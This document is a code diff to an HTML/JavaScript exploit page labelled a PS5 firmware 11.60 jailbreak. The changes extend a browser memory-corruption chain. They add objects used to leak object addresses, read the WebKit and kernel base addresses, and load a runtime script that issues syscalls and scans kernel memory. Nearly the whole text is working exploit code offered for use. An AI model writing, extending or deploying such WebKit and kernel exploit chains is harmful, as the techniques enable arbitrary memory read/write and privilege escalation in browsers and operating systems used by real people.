@@ -1,7 +1,7 @@
 <!doctype html>
 <!--
   PS5 FW 11.60 genuine-view R/W bootstrap + full jailbreak.
-  Leaks webkitBase & kernelBase, then injects kexp/elfldr.
+  Leaks webkitBase & kernelBase using targetHolder, then injects kexp/elfldr.
 -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <body style="font:13px monospace"><pre id="out"></pre>
@@ -53,6 +53,16 @@ var lengthWord = null;
 var fillerGraph = null;
 var outerGraph = null;
 
+// --- NEW: objects for base leak ---
+var nativeTarget = parseInt;
+var arenaBuffer = null;
+var arenaView = null;
+var realCollator = null;
+var compareFn = null;
+var holderGuardA = null;
+var holderGuardB = null;
+var targetHolder = null;
+
 var leakedScope = null;
 var getterCarrier = null;
 var preparedSymbolObject = null;
@@ -63,13 +73,14 @@ var captureState = 0;
 var captureError = null;
 var hostAddress = NaN;
 var fakeAddress = NaN;
+var targetHolderAddress = NaN;  // new
 
 var keepAlive = new Array(DRAIN_COUNT + 3);
 var keepIndex = 0;
 var predecessorWords = null;
 var pointerLow = 0;
 var pointerHigh = 0;
-var targetAddress = NaN;
+var targetAddress = NaN;   // still targetView for ARW test
 var targetAddressLow = 0;
 var targetAddressHigh = 0;
 
@@ -93,7 +104,7 @@ var compositionState = 0;
 var compositionLength = 0;
 var compositionError = null;
 
-// --- NEW: global state for payload injection ---
+// --- GLOBAL for payload injection ---
 var g_candidate = null;
 var arwReady = false;
 var webkitBase = 0;
@@ -170,6 +181,7 @@ function encodedHeaderNumber() {
 }
 
 function buildFakeHost() {
+    // --- Original ARW objects ---
     rwBuffer = new ArrayBuffer(0x100);
     rwView = new Uint8Array(rwBuffer);
     rwMirror = new Uint8Array(rwBuffer);
@@ -188,7 +200,6 @@ function buildFakeHost() {
         q4: 2.2,
         q5: 3.3
     };
-
     delete fakeHost.q1;
     delete fakeHost.q4;
     delete fakeHost.q5;
@@ -197,6 +208,28 @@ function buildFakeHost() {
         || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
         || targetView[0] !== 0xa5)
         throw new Error("fake-host-shape-failed");
+
+    // --- NEW: targetHolder for base leak ---
+    arenaBuffer = new ArrayBuffer(0x1000);
+    arenaView = new Uint8Array(arenaBuffer);
+    arenaView[0xf00] = 0x52;
+    arenaView[0xf01] = 0x4f;
+    arenaView[0xf02] = 0x50;
+    arenaView[0xf03] = 0x31;
+    realCollator = new Intl.Collator("en", { usage: "search" });
+    compareFn = realCollator.compare;
+    if (!(compareFn("a", "b") < 0))
+        throw new Error("collator-prewarm-failed");
+    holderGuardA = { marker: 0x484f4c44 };
+    holderGuardB = { marker: 0x47554152 };
+    targetHolder = {
+        q0: nativeTarget,
+        q1: arenaView,
+        q2: realCollator,
+        q3: compareFn,
+        q4: holderGuardA,
+        q5: holderGuardB
+    };
 }
 
 function buildAndStoreGraph() {
@@ -221,11 +254,11 @@ function buildAndStoreGraph() {
 
     mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
     history.replaceState(outerGraph, "");
-    mark("SSV-STORED", "fake-host-rw-target-not-serialized");
+    mark("SSV-STORED", "fake-host-and-targetHolder-not-serialized");
 }
 
 function prepareAddrof() {
-    capturedWords = new Uint16Array(16);
+    capturedWords = new Uint16Array(24); // increased to hold 6 pointers (host, targetView, targetHolder, and duplicates)
     getterCarrier = function getterCarrierFunction() { return 7; };
 
     mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
@@ -235,7 +268,9 @@ function prepareAddrof() {
     getterCarrier[1] = targetView;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetView;
-    mark("ADDROF-CARRIER-DONE", "host-target-host-target");
+    getterCarrier[4] = targetHolder;
+    getterCarrier[5] = targetHolder;
+    mark("ADDROF-CARRIER-DONE", "host-target-host-target-holder-holder");
 
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
     mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
@@ -248,7 +283,7 @@ function runAddrofCapture() {
     try {
         capturedString = symbolToString.call(preparedSymbolObject);
         copiedLength = capturedString.length;
-        for (var i = 0; i < 16; i++)
+        for (var i = 0; i < 24; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
         captureState = 1;
     } catch (error) {
@@ -475,7 +510,7 @@ function loadHistoryCritical() {
         restoreObserved = rwView[0] === 0x3c
             && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
-        // --- SAVE CANDIDATE FOR SLOPKIT ---
+        // --- SAVE CANDIDATE AND TARGET HOLDER ADDRESS ---
         g_candidate = candidate;
         candidate = null;
         clearPredecessor();
@@ -564,9 +599,11 @@ function leakBases() {
     if (!g_candidate || !rwView) return false;
     var cand = g_candidate;
 
-    // 1. Leak webkitBase from native constructor (like notify.html)
-    // Read the holder (targetHolder) at targetAddress
-    aimCarrier(cand, targetAddress);
+    // Use targetHolderAddress (leaked from addrof) to read the holder
+    if (!plausibleAddress(targetHolderAddress)) return false;
+
+    // Read the holder (targetHolder) at targetHolderAddress
+    aimCarrier(cand, targetHolderAddress);
     var holderBytes = new Uint8Array(0x40);
     for (var i = 0; i < 0x40; i++) holderBytes[i] = rwView[i];
     var nativeTargetAddr = low48AtRaw(holderBytes, 0x10);
@@ -743,10 +780,10 @@ function reportComposition() {
                         rwView: rwView,
                         aimCarrier: aimCarrier,
                         restoreCarrier: restoreCarrier,
-                        arenaView: null,
-                        arenaBacking: null,
-                        targetHolder: null,
-                        targetAddress: targetAddress,
+                        arenaView: arenaView,
+                        arenaBacking: 0, // not needed
+                        targetHolder: targetHolder,
+                        targetAddress: targetHolderAddress,
                         kernelBase: kernelBase,
                         webkitBase: webkitBase,
                         FW_VERSION: "11.60",
@@ -784,23 +821,19 @@ function loadLapseRuntime() {
             getpid: 20n,
             fcntl: 92n,
             pipe: 42n,
-            // Add other syscalls if needed; lapse-runtime.js will extend this object
         };
     }
 
     mark("LOADING-RUNTIME", "loading lapse-runtime.js");
     var script = document.createElement('script');
-    // Add cache-buster to avoid stale cached version
     script.src = 'lapse-runtime.js?t=' + Date.now();
     script.onload = function() {
         mark("RUNTIME-LOADED", "lapse-runtime.js loaded");
-        // Now we have syscall, read64, write64, create_pipe, load_aioshellcode
         try {
             const pid = window.syscall(window.SYSCALL.getpid);
             mark("CURRENT-PID", String(pid));
 
             // Scan for allproc using the renderer's read64 (which uses aimCarrier)
-            // We use a wide range for 11.60
             const start = 0xFFFFFFFF80000000n;
             const end = 0xFFFFFFFF90000000n;
             let found = 0n;
@@ -903,21 +936,25 @@ function beginComposition() {
         return;
     }
 
+    // Read 6 pointers: host, targetView, host2, targetView2, targetHolder, targetHolder2
     var a0 = pointerFromWords(capturedWords, 0);
     var b0 = pointerFromWords(capturedWords, 4);
     var a1 = pointerFromWords(capturedWords, 8);
     var b1 = pointerFromWords(capturedWords, 12);
-    var repeated = a0 === a1 && b0 === b1;
-    var distinct = a0 !== b0;
-    var plausible = plausibleCell(a0) && plausibleCell(b0)
-        && plausibleCell(a1) && plausibleCell(b1);
+    var c0 = pointerFromWords(capturedWords, 16);
+    var c1 = pointerFromWords(capturedWords, 20);
+    var repeated = a0 === a1 && b0 === b1 && c0 === c1;
+    var distinct = a0 !== b0 && b0 !== c0 && a0 !== c0;
+    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(c0)
+        && plausibleCell(a1) && plausibleCell(b1) && plausibleCell(c1);
     var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
     var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
     mark("ADDROF-RETURNED", REVISION);
     mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
     mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
-        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
+        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1)
+        + "-HOLDER=" + hex(c0) + "-HOLDER2=" + hex(c1));
 
     if (!(repeated && distinct && plausible && sourceCovered)) {
         mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
@@ -927,6 +964,7 @@ function beginComposition() {
 
     hostAddress = a0;
     targetAddress = b0;
+    targetHolderAddress = c0;
     targetAddressHigh = Math.floor(targetAddress / 0x100000000);
     targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
     if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
